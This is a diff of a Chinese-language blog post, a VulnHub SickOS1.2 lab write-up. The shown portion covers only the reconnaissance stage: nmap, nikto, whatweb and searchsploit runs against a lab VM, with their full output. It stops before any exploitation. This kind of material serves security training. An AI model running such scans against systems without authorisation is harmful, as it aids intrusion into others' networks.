@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  SickOS1.2 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  SickOS1.2 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
 if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
  font-family: BenderLight;
  src: local('Bender'), url("/font/BenderLight.ttf");
@@ -17,38 +17,168 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 }</style><style>:root {
   --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
   --light-background: url('/img/bk.jpg');
-}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  SickOS1.2</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:37:04.999Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:37:32.771Z" id="updated"> 2023-05-24</time></div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/853e1f76c1d44925cbd6ac026246fe1a12342800.png'><img src="/pic/853e1f76c1d44925cbd6ac026246fe1a12342800.png" alt="853e1f76c1d44925cbd6ac026246fe1a12342800"></p>
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  SickOS1.2</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:37:04.999Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:37:32.771Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">5k</div></span><br><span>Read Time: <div class="control">28 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/853e1f76c1d44925cbd6ac026246fe1a12342800.png'><img src="/pic/853e1f76c1d44925cbd6ac026246fe1a12342800.png" alt="853e1f76c1d44925cbd6ac026246fe1a12342800"></p>
 <span id="more"></span>
 
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Host detection</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sn 192.168.56.0/24<br>[sudo] password for kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:28 EDT<br>Nmap scan report for 192.168.56.1<br>Host is up (0.00026s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report for 192.168.56.2<br>Host is up (0.00014s latency).<br>MAC Address: 00:50:56:EC:CE:9E (VMware)<br>Nmap scan report for 192.168.56.136<br>Host is up (0.00012s latency).<br>MAC Address: 00:0C:29:F7:DE:A9 (VMware)<br>Nmap scan report for 192.168.56.254<br>Host is up (0.00083s latency).<br>MAC Address: 00:50:56:E2:96:B0 (VMware)<br>Nmap scan report for 192.168.56.132<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.09 seconds<br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sn 192.168.56.0/24
+[sudo] password for kali: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:28 EDT
+Nmap scan report for 192.168.56.1
+Host is up (0.00026s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 192.168.56.2
+Host is up (0.00014s latency).
+MAC Address: 00:50:56:EC:CE:9E (VMware)
+Nmap scan report for 192.168.56.136
+Host is up (0.00012s latency).
+MAC Address: 00:0C:29:F7:DE:A9 (VMware)
+Nmap scan report for 192.168.56.254
+Host is up (0.00083s latency).
+MAC Address: 00:50:56:E2:96:B0 (VMware)
+Nmap scan report for 192.168.56.132
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.09 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Port scan</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.136        <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:31 EDT<br>Nmap scan report for 192.168.56.136<br>Host is up (0.0012s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:F7:DE:A9 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p- --min-rate=10000 192.168.56.136        
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:31 EDT
+Nmap scan report for 192.168.56.136
+Host is up (0.0012s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:F7:DE:A9 (VMware)
 
+Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>只开了<code>22,80</code>两个端口，攻击面有点小。</p>
 <p>TCP Service OS</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,80 192.168.56.136 <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:32 EDT<br>Nmap scan report for 192.168.56.136<br>Host is up (0.00093s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    lighttpd 1.4.28<br>MAC Address: 00:0C:29:F7:DE:A9 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sT -sV -O -p22,80 192.168.56.136 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:32 EDT
+Nmap scan report for 192.168.56.136
+Host is up (0.00093s latency).
 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+MAC Address: 00:0C:29:F7:DE:A9 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>80端口运行的lighttpd服务版本是1.4.28，其他没啥信息了。</p>
 <p>UDP</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sU 192.168.56.136<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:35 EDT<br>Nmap scan report for 192.168.56.136<br>Host is up (0.00056s latency).<br>All 1000 scanned ports on 192.168.56.136 are in ignored states.<br>Not shown: 1000 open|filtered udp ports (no-response)<br>MAC Address: 00:0C:29:F7:DE:A9 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 21.73 seconds<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU 192.168.56.136
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:35 EDT
+Nmap scan report for 192.168.56.136
+Host is up (0.00056s latency).
+All 1000 scanned ports on 192.168.56.136 are in ignored states.
+Not shown: 1000 open|filtered udp ports (no-response)
+MAC Address: 00:0C:29:F7:DE:A9 (VMware)
 
+Nmap done: 1 IP address (1 host up) scanned in 21.73 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>过。</p>
 <p>Vuln scan</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln 192.168.56.136 <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:36 EDT<br>Nmap scan report for 192.168.56.136<br>Host is up (0.0017s latency). <br>Not shown: 998 filtered tcp ports (no-response)  <br>PORT   STATE SERVICE     <br>22/tcp open  ssh  <br>80/tcp open  http <br>|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities. <br>|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.<br>| http-slowloris-check:                <br>|   VULNERABLE:              <br>|   Slowloris DOS attack                <br>|     State: LIKELY VULNERABLE <br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server&#x27;s resources causing Denial Of Service.<br>|       <br>|     Disclosure date: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|_  /test/: Test page<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.<br>MAC Address: 00:0C:29:F7:DE:A9 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 87.09 seconds<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nmap --script=vuln 192.168.56.136 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:36 EDT
+Nmap scan report for 192.168.56.136
+Host is up (0.0017s latency). 
+Not shown: 998 filtered tcp ports (no-response)  
+PORT   STATE SERVICE     
+22/tcp open  ssh  
+80/tcp open  http 
+|_http-csrf: Couldn't find any CSRF vulnerabilities. 
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-slowloris-check:                
+|   VULNERABLE:              
+|   Slowloris DOS attack                
+|     State: LIKELY VULNERABLE 
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+| http-enum: 
+|_  /test/: Test page
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+MAC Address: 00:0C:29:F7:DE:A9 (VMware)
 
+Nmap done: 1 IP address (1 host up) scanned in 87.09 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>只有一个可能存在的DOS漏洞，没啥帮助。</p>
 <p>vuln search</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit lighttpd 1.4   <br>-------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                |  Path<br>-------------------------------------------------------------------------------------------------------------- ---------------------------------<br>lighttpd - Denial of Service (PoC)                                                                            | linux/dos/18295.txt<br>Lighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities        | windows/remote/30322.rb<br>Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                            | multiple/remote/4391.c<br>Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                            | linux/remote/4437.c<br>lighttpd 1.4.31 - Denial of Service (PoC)                                                                     | linux/dos/22902.sh<br>Lighttpd 1.4.x - mod_userdir Information Disclosure                                                           | linux/remote/31396.txt<br>lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                             | linux/dos/33591.sh<br>Lighttpd &lt; 1.4.23 (BSD/Solaris) - Source Code Disclosure                                                      | multiple/remote/8786.txt<br>-------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ searchsploit lighttpd 1.4   
+-------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                <span class="token operator">|</span>  Path
+-------------------------------------------------------------------------------------------------------------- ---------------------------------
+lighttpd - Denial of Service <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>                                                                            <span class="token operator">|</span> linux/dos/18295.txt
+Lighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities        <span class="token operator">|</span> windows/remote/30322.rb
+Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                            <span class="token operator">|</span> multiple/remote/4391.c
+Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                            <span class="token operator">|</span> linux/remote/4437.c
+lighttpd 1.4.31 - Denial of Service <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>                                                                     <span class="token operator">|</span> linux/dos/22902.sh
+Lighttpd 1.4.x - mod_userdir Information Disclosure                                                           <span class="token operator">|</span> linux/remote/31396.txt
+lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                             <span class="token operator">|</span> linux/dos/33591.sh
+Lighttpd <span class="token operator">&lt;</span> 1.4.23 <span class="token punctuation">(</span>BSD/Solaris<span class="token punctuation">)</span> - Source Code Disclosure                                                      <span class="token operator">|</span> multiple/remote/8786.txt
+-------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在exp-db也没找到 lighttpd 1.4.28可以用的漏洞</p>
 <h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><p><code>nmap</code>没扫出什么信息，试试<code>nikto</code>。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nikto -h 192.168.56.136                                     <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.136<br>+ Target Hostname:    192.168.56.136<br>+ Target Port:        80<br>+ Start Time:         2023-04-19 11:40:45 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: lighttpd/1.4.28<br>+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)<br>+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .<br>+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /test/: Directory indexing found.<br>+ /test/: This might be interesting.<br>+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.<br>+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host<br>+ End Time:           2023-04-19 11:41:11 (GMT-4) (26 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ sudo nikto -h 192.168.56.136                                     
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.136
++ Target Hostname:    192.168.56.136
++ Target Port:        80
++ Start Time:         2023-04-19 11:40:45 (GMT-4)
+---------------------------------------------------------------------------
++ Server: lighttpd/1.4.28
++ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
++ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /test/: Directory indexing found.
++ /test/: This might be interesting.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2023-04-19 11:41:11 (GMT-4) (26 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>只发现了一个<code>/test</code>目录。其他没啥信息。</p>
-<h3 id="Web-fingerprint"><a href="#Web-fingerprint" class="headerlink" title="Web fingerprint"></a>Web fingerprint</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ whatweb 192.168.56.136<br>http://192.168.56.136 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.28], IP[192.168.56.136], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21], lighttpd[1.4.28]<br></code></pre></td></tr></table></figure>
-
+<h3 id="Web-fingerprint"><a href="#Web-fingerprint" class="headerlink" title="Web fingerprint"></a>Web fingerprint</h3><pre class="line-numbers language-shell"><code class="language-shell">┌──(kali㉿kali)-[~]
+└─$ whatweb 192.168.56.136
+http://192.168.56.136 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.28], IP[192.168.56.136], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21], lighttpd[1.4.28]
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>网页后端是php写的。</p>
 <h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>先开网页看一眼吧</p>
 <p class='item-img' data-src='/pic/assets/1681996062502-828dc8fd-abed-412c-ae2e-a116bd53fbc8.png'><img src="/pic/assets/1681996062502-828dc8fd-abed-412c-ae2e-a116bd53fbc8.png"></p>
@@ -57,83 +187,478 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <p class='item-img' data-src='/pic/assets/1681996062487-c79fb526-4fa6-4980-9b2d-6cc634190caa.png'><img src="/pic/assets/1681996062487-c79fb526-4fa6-4980-9b2d-6cc634190caa.png"></p>
 <p>发现目录是空的，啥也没有。</p>
 <p>得。先目录扫描一下看看有没有其他目录吧。</p>
